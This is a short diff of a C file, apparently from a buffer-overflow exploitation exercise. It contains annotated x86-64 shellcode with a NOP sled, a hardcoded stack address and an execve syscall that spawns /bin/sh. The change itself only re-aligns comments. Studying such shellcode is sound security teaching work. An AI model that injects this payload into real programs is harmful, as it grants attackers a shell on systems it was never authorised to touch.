@@ -111,9 +111,8 @@ int main() {
     "\x90" "\x90" "\x90"                // nop; nop; nop
     "\x48\x31" "\xD2"                   // xor %rdx, %rdx
     "\x48\x31" "\xF6"                   // xor %rsi, %rsi
-    "\x48\xBF" "\xDC\xEA\xFF\xFF"
-    "\xFF\x7F\x00\x00"                  // mov $0x7fffffffeadc,
-                                        //   %rdi
+    "\x48\xBF" "\xDC\xEA\xFF\xFF"       // mov $0x7fffffffeadc,
+    "\xFF\x7F\x00\x00"                  //   %rdi
     "\x48\xC7\xC0" "\x3B\x00\x00\x00"   // mov $0x3b, %rax
     "\x0F\x05"                          // syscall
     // 8 байт строки /bin/sh
